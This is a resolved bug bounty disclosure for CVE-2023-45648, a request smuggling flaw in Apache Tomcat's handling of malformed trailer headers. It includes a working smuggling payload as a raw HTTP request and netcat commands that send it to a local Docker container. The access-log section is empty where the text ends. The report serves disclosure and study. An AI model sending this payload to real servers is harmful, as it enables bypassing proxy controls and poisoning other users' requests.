# [H] Request Smuggling in Apache Tomcat (Important, CVE-2023-45648)

## Summary
Severity: High (CVSS 8.2)
Program: Internet Bug Bounty
Weakness: HTTP Request Smuggling
Reporter: mukeran
State: resolved
Disclosed: 2024-02-07T08:51:04.160Z
CVE: CVE-2023-45648
Source: https://hackerone.com/reports/2299692

## Details
Apache Tomcat supports Trailer Section. However, we found that in version prior than 11.0.0-M11, 10.1.13, 9.0.80, 8.5.93, Apache Tomcat cannot properly parse the trailer section if there's no colon in the trailer header's line. It will skip the following lines until the last line with a valid colon-separated key-value header pair, which can be leveraged to perform HTTP request smuggling.

If we send the following payload, the headers of the second request **(Line 12-15)** will be regarded as the trailer section of the first request, while the content of the second request **(Line 17-19)** is processed as the second request. When sending this payload to other HTTP implementations such as NGINX, **Line 12-21** would be the second request.
```http
POST /benign_path HTTP/1.1
Host: a.com
Connection: keep-alive
Transfer-Encoding: chunked

5
12345
0
Content: hello
a

POST /benign_path HTTP/1.1
Host: a.com
Connection: keep-alive
Content-Length: 37

GET /evil_path HTTP/1.1
Any: any
Host: b.com


```

Reproduce:
```shell
docker run -d --name hrs_tomcat_11 -p 43022:8080 tomcat:10.1.13
echo -n 'POST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n5\r\n12345\r\n0\r\nContent: hello\r\na\r\n\r\nPOST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection: keep-alive\r\nContent-Length: 37\r\n\r\nGET /evil_path HTTP/1.1\r\nAny: any\r\nHost: b.com\r\n\r\n' | nc 127.0.0.1 43022
docker exec -it hrs_tomcat_11 /bin/sh -c "cat /usr/local/tomcat/logs/localhost*"
```

Access log:
```
